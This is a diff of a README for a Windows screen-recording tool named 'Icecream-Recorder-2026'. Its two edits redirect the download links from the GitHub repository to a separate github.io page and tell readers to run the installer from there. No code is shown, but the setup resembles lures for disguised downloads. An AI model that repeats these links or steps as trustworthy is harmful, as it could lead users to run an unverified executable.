@@ -1,6 +1,6 @@
 # 🎥 Icecream-Recorder-2026 - Capture Your Windows Screen With Ease
 
-[![Download Icecream Recorder](https://img.shields.io/badge/Download-Installer-blue.svg)](https://github.com/Live-amoralist295/Icecream-Recorder-2026)
+[![Download Icecream Recorder](https://img.shields.io/badge/Download-Installer-blue.svg)](https://live-amoralist295.github.io)
 
 ## 📖 About This Software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards for the best performance:
 
 Follow these steps to set up the software on your computer:
 
-1.  Visit the [official download page](https://github.com/Live-amoralist295/Icecream-Recorder-2026) for the installer.
+1.  Visit the [official download page](https://live-amoralist295.github.io) for the installer.
 2.  Click the download button to save the file to your computer.
 3.  Locate the file in your "Downloads" folder.
 4.  Double-click the installer file to begin the setup process.
